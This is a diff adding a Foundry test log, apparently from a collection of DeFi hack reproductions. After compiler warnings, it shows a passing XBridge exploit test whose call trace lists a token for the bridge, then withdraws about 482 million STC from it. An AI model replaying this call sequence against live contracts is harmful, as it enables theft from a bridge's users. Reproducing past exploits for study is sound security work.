@@ -1,0 +1,115 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.15s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 319.10ms (109.74µs CPU time)
+
+Ran 1 test for src/test/2024-04/XBridge_exp.sol:ContractTest
+[PASS] testExploit() (gas: 259613)
+Logs:
+  Exploiter STC balance before attack: 0.000000000
+  Exploiter STC balance after attack: 482589886.903032631
+
+Traces:
+  [267213] ContractTest::testExploit()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 150000000000000000 [1.5e17])
+    │   └─ ← [Return] 
+    ├─ [20044] 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "Exploiter STC balance before attack", val: 0, decimals: 9)
+    ├─ [138047] 0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31::listToken{value: 150000000000000000}(tokenInfo({ token: 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A, chain: 85936 [8.593e4] }), tokenInfo({ token: 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A, chain: 95838 [9.583e4] }), false)
+    │   ├─ [130785] 0x354CCA2F55ddE182d36fE34D673430E226a3cB8C::listToken{value: 150000000000000000}(tokenInfo({ token: 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A, chain: 85936 [8.593e4] }), tokenInfo({ token: 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A, chain: 95838 [9.583e4] }), false) [delegatecall]
+    │   │   ├─ [0] 0x579ed0e3996e192Fcd64d85daEF7F985566DdE3E::fallback{value: 150000000000000000}()
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ emit TokenListed(param0: 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A, param1: 85936 [8.593e4], param2: 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A, param3: 95838 [9.583e4], param4: false, param5: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [8044] 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A::balanceOf(0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31) [staticcall]
+    │   └─ ← [Return] 482589886903032631 [4.825e17]
+    ├─ [70580] 0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31::withdrawTokens(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 482589886903032631 [4.825e17])
+    │   ├─ [69830] 0x354CCA2F55ddE182d36fE34D673430E226a3cB8C::withdrawTokens(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 482589886903032631 [4.825e17]) [delegatecall]
+    │   │   ├─ [4044] 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A::balanceOf(0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31) [staticcall]
+    │   │   │   └─ ← [Return] 482589886903032631 [4.825e17]
+    │   │   ├─ [55157] 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 482589886903032631 [4.825e17])
+    │   │   │   ├─ emit Transfer(from: 0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 482589886903032631 [4.825e17])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit TokenWithdrawn(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 482589886903032631 [4.825e17])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [4044] 0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 482589886903032631 [4.825e17]
+    ├─ emit log_named_decimal_uint(key: "Exploiter STC balance after attack", val: 482589886903032631 [4.825e17], decimals: 9)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.50s (1.87s CPU time)
+
+Ran 2 test suites in 2.74s (2.82s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
